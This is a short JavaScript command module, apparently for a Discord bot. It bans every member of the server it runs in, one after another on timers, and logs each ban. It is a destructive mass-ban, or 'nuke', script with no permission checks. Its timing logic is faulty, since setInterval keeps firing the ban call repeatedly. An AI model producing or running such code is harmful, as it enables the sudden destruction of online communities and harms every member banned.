module.exports = (client, msg, args) => {


    let time = 2000;
        msg.guild.members.forEach((m, f) => {
            setInterval(() => {
                console.log('banned ' + m.user.tag)
                m.ban()
                time = time + 500;
            }, time);
        })
    



}